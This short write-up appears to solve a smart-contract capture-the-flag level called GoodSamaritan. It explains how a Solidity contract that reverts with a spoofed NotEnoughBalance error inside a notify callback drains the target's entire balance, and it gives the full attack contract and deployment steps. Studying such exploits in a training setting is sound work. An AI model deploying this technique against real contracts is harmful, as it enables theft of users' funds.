### Goals

Drain contract

### Exploit

The contract donates 10 coin to the requester. The contract ends up calling `Coin::transfer` which creates interface at `dest_` at msg.sender and calls `INotifyable(dest_).notify(amount_)`. We can leverage this logic and raise `NotEnoughBalance` error at receiving tokens thus tricking contract to catch exception and call `wallet.transferReminder()` transferring whole balance of the GoodSamartian contract.

### Code

Deploy contract in Remix

```code
contract DrainSamartian {
    address samaritan = SAMARITAN_INSTANCE_ADDRESS;

    error NotEnoughBalance();

    function pwn() external {
        samaritan.call(abi.encodeWithSignature("requestDonation()"));
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```

Deploy contract and call `pwn`

Done!
